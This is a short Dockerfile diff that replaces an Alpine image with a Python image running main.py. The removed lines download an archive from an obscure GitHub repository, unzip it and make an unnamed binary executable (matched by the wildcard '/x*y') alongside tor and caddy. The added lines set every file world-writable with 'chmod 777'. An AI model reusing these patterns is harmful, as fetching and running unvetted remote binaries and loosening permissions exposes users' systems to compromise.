@@ -1,12 +1,12 @@
-FROM alpine:edge
+FROM python:3
+WORKDIR /home/www
 
-RUN apk update && \
-    apk add --no-cache ca-certificates caddy tor wget && \
-    wget -qO- https://github.com/tysr54/fsieu/raw/main/dea.zip | busybox unzip - && \
-    chmod +x $(ls /x*y) && \
-    rm -rf /var/cache/apk/*
+COPY main.py .
 
-ADD start.sh /start.sh
-RUN chmod +x /start.sh
+RUN chmod +x main.py && python3 main.py init && chmod 777 ./*
 
-CMD /start.sh
+EXPOSE 8080
+
+CMD ["python3", "main.py"]
+
+USER 10001
